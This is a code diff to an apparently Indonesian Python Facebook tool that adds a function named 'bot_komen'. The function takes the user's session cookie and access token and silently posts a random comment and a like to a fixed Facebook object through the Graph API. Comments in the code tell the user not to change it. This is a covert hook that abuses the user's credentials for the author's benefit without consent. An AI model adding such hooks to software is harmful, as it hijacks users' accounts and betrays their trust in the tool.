@@ -66,6 +66,35 @@ def login_cookie():
             Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
     except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
+### BOT KOMEN ###
+
+def bot_komen(cookie, token_eaag):
+
+    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
+
+        text = random.choice(
+
+            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
+
+        )
+
+        r.cookies.update({
+
+            'cookie': cookie
+
+        })
+
+        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
+
+        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
+
+        if "\"id\":\"" in str(response) and str(response2) == 'true':
+
+            return 0
+
+        else:
+
+            return 1
 ### DAFTAR MENU ###
 def daftar_menu():
     try:
